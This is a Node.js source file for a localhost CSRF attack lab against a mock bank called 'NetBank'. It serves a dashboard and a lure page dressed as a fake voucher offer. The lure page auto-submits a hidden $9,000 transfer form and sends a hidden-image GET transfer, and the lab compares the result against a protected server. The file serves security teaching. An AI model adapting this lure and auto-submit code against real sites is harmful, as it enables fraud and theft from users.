/*
 * How to Run:
 *
 * Terminal 1: cd demo-attacked/csrf && npm install && npm run vulnerable
 * Terminal 2: cd demo-attacked/csrf && npm run guide
 *
 * Attack sequence:
 * 1. http://localhost:3010  ← Log in as john.doe / password123
 * 2. http://localhost:3011  ← Read attack flow, open lure page
 * 3. Lure auto-submits transfer — return to NetBank to see drained balance
 */

const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 3011;
const VICTIM_PORT = 3010;
const PROTECTED_PORT = 3012;

app.use(cors());

const SWITCHER_CSS = `
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #ef4444;
    }`;

const SWITCHER_HTML = `
  <div class="target-switcher">
    <button type="button" class="btn-vulnerable active" id="btn-vulnerable">Vulnerable (:3010)</button>
    <button type="button" class="btn-protected" id="btn-protected">Protected (:3012)</button>
  </div>`;

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF Attack Lab — NetBank</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 { font-size: 1.4rem; margin-bottom: 0.5rem; text-shadow: 0 0 8px rgba(0,255,65,0.4); }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
    }
    .flow-box strong { color: #facc15; }
    .btn-lure {
      display: inline-block;
      background: #dc2626;
      color: #fff;
      text-decoration: none;
      padding: 0.85rem 1.75rem;
      border-radius: 8px;
      font-weight: 700;
      font-size: 1rem;
      margin-bottom: 1.5rem;
    }
    .btn-lure:hover { background: #b91c1c; }
    .note {
      background: #1a1a1a;
      border-left: 4px solid #facc15;
      padding: 1rem 1.25rem;
      font-size: 0.85rem;
      line-height: 1.7;
      color: #94a3b8;
      max-width: 640px;
    }
    .note em { color: #facc15; font-style: normal; }
    ${SWITCHER_CSS}
  </style>
</head>
<body>
  <h1>CSRF Attack Lab — NetBank</h1>
  <p class="subtitle">Cross-Site Request Forgery — the browser sends the cookie, not JavaScript</p>

  <div class="flow-box">
    <strong>Attack flow:</strong><br>
    1. Victim logs into NetBank at <strong>localhost:${VICTIM_PORT}</strong><br>
    2. Victim visits the lure page (link below)<br>
    3. Lure page silently submits a hidden form to <strong>localhost:${VICTIM_PORT}/transfer</strong><br>
    4. Browser auto-attaches <code>nb_session</code> cookie — NetBank processes the transfer<br>
    5. Victim checks their balance — <strong>$9,000</strong> is gone
  </div>

  <a class="btn-lure" href="/lure">Open Lure Page →</a>

  <div class="note">
    <em>HttpOnly=true</em> on <code>nb_session</code> — yet the attack still works. CSRF does
    not need JS to read the cookie. The browser sends it automatically on every request
    to the matching domain, even when the request originates from a different origin.
  </div>

  ${SWITCHER_HTML}

  <script>
    document.getElementById('btn-vulnerable').addEventListener('click', function () {
      window.open('http://localhost:${VICTIM_PORT}', '_blank');
      document.getElementById('btn-vulnerable').classList.add('active');
      document.getElementById('btn-protected').classList.remove('active');
    });

    document.getElementById('btn-protected').addEventListener('click', function () {
      window.open('http://localhost:${PROTECTED_PORT}', '_blank');
      document.getElementById('btn-protected').classList.add('active');
      document.getElementById('btn-vulnerable').classList.remove('active');
    });
  </script>
</body>
</html>`;

const LURE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ShopNest Rewards — Claim Your Voucher</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f8fafc;
      color: #1e293b;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem;
    }
    .card {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 8px 32px rgba(13, 110, 110, 0.12);
      max-width: 480px;
      width: 100%;
      padding: 2.5rem;
      text-align: center;
      border: 1px solid #e2e8f0;
    }
    .logo { font-size: 1.5rem; font-weight: 700; color: #0d6e6e; margin-bottom: 1.5rem; }
    h1 { font-size: 1.35rem; margin-bottom: 0.75rem; color: #0f172a; }
    p { color: #64748b; line-height: 1.6; margin-bottom: 1.5rem; font-size: 0.95rem; }
    .btn-reward {
      background: #0d6e6e;
      color: #fff;
      border: none;
      padding: 0.85rem 2rem;
      border-radius: 10px;
      font-size: 1rem;
      font-weight: 600;
      cursor: default;
      opacity: 0.85;
    }
    .spinner {
      display: none;
      margin: 1.5rem auto;
      width: 40px;
      height: 40px;
      border: 4px solid #e2e8f0;
      border-top-color: #0d6e6e;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    .spinner.visible { display: block; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success {
      display: none;
      color: #16a34a;
      font-size: 1.1rem;
      font-weight: 600;
      margin-top: 1rem;
    }
    .success.visible { display: block; }
    .processing { color: #64748b; font-size: 0.9rem; margin-top: 1rem; display: none; }
    .processing.visible { display: block; }
    .result-banner {
      display: none;
      margin-top: 1.25rem;
      padding: 1rem 1.25rem;
      border-radius: 10px;
      font-size: 0.9rem;
      font-weight: 600;
      line-height: 1.5;
    }
    .result-banner.success {
      display: block;
      background: #dcfce7;
      color: #166534;
      border: 1px solid #86efac;
    }
    .result-banner.blocked {
      display: block;
      background: #fee2e2;
      color: #991b1b;
      border: 1px solid #fca5a5;
    }
    .result-banner.unreachable {
      display: block;
      background: #fef3c7;
      color: #92400e;
      border: 1px solid #fcd34d;
    }
    .btn-reset {
      display: none;
      margin-top: 1.25rem;
      background: #0f172a;
      color: #fff;
      border: none;
      padding: 0.65rem 1.25rem;
      border-radius: 8px;
      font-size: 0.9rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn-reset.visible { display: inline-block; }
    ${SWITCHER_CSS}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">ShopNest 🛒</div>
    <h1>You have a $500 store voucher waiting!</h1>
    <p>As a valued customer, you've been selected for an exclusive rewards voucher.
       Click below to claim your $500 credit.</p>
    <button class="btn-reward" type="button">Claim Your Reward</button>
    <div class="spinner" id="spinner"></div>
    <p class="processing" id="processing">Processing your reward…</p>
    <p class="success" id="success">🎉 Your $500 voucher has been applied!</p>
    <div class="result-banner" id="result-banner"></div>
    <button type="button" class="btn-reset" id="btn-reset">Reset / Try Again</button>
  </div>

  <iframe name="csrf-frame" style="display:none" title="hidden"></iframe>

  <form id="csrf-form" action="http://localhost:${VICTIM_PORT}/transfer" method="POST" target="csrf-frame">
    <input type="hidden" name="recipient" value="Attacker_Offshore_Acct">
    <input type="hidden" name="account" value="HACK-9999-XXXX">
    <input type="hidden" name="amount" value="9000">
  </form>

  <img id="csrf-get-img" src="http://localhost:${VICTIM_PORT}/transfer-get?recipient=Attacker_GET&amp;account=HACK-GET&amp;amount=1" width="1" height="1" alt="" style="position:absolute;opacity:0">

  ${SWITCHER_HTML}

  <script>
    var targetPort = ${VICTIM_PORT};
    var attackSubmitted = false;

    function updateFormAction() {
      document.getElementById('csrf-form').action =
        'http://localhost:' + targetPort + '/transfer';
      document.getElementById('csrf-get-img').src =
        'http://localhost:' + targetPort + '/transfer-get?recipient=Attacker_GET&account=HACK-GET&amount=1';
    }

    function clearResult() {
      var banner = document.getElementById('result-banner');
      banner.className = 'result-banner';
      banner.textContent = '';
      document.getElementById('success').classList.remove('visible');
      document.getElementById('btn-reset').classList.remove('visible');
    }

    function showResult(type, message) {
      var banner = document.getElementById('result-banner');
      banner.className = 'result-banner ' + type;
      banner.textContent = message;
      document.getElementById('btn-reset').classList.add('visible');
    }

    function finishAttempt() {
      document.getElementById('spinner').classList.remove('visible');
      document.getElementById('processing').classList.remove('visible');
    }

    function checkOutcome() {
      fetch('http://localhost:' + targetPort + '/api/account', { credentials: 'include' })
        .then(function (res) {
          if (res.status === 403) {
            showResult('blocked', '🛡️ Attack blocked — CSRF token validation failed (403 Forbidden)');
            return null;
          }
          if (!res.ok) {
            showResult('unreachable', '⚠️ Could not reach localhost:' + targetPort + ' — is the server running? (HTTP ' + res.status + ')');
            return null;
          }
          return res.json();
        })
        .then(function (data) {
          if (!data) return;
          if (data.balance < 50000) {
            showResult('success', '✅ Transfer sent — $9,000 stolen. Return to NetBank to confirm.');
          } else {
            showResult('blocked', '🛡️ Attack blocked — CSRF token validation failed (403 Forbidden)');
          }
        })
        .catch(function () {
          showResult('unreachable', '⚠️ Could not reach localhost:' + targetPort + ' — is the server running?');
        })
        .finally(finishAttempt);
    }

    function submitAttack() {
      if (attackSubmitted) return;
      attackSubmitted = true;
      clearResult();
      document.getElementById('spinner').classList.add('visible');
      document.getElementById('processing').classList.add('visible');
      document.getElementById('csrf-form').submit();
      setTimeout(checkOutcome, 1200);
    }

    document.getElementById('btn-reset').addEventListener('click', function () {
      attackSubmitted = false;
      clearResult();
      submitAttack();
    });

    document.getElementById('btn-vulnerable').addEventListener('click', function () {
      targetPort = ${VICTIM_PORT};
      updateFormAction();
      clearResult();
      document.getElementById('btn-vulnerable').classList.add('active');
      document.getElementById('btn-protected').classList.remove('active');
      attackSubmitted = false;
      submitAttack();
    });

    document.getElementById('btn-protected').addEventListener('click', function () {
      targetPort = ${PROTECTED_PORT};
      updateFormAction();
      clearResult();
      document.getElementById('btn-protected').classList.add('active');
      document.getElementById('btn-vulnerable').classList.remove('active');
      attackSubmitted = false;
      submitAttack();
    });

    window.onload = function () {
      updateFormAction();
      submitAttack();
    };
  </script>
</body>
</html>`;

app.get('/', (req, res) => {
  res.send(DASHBOARD_HTML);
});

app.get('/lure', (req, res) => {
  res.send(LURE_HTML);
});

app.listen(PORT, () => {
  console.log(`CSRF attacker server running at http://localhost:${PORT}`);
  console.log(`Lure page: http://localhost:${PORT}/lure`);
});
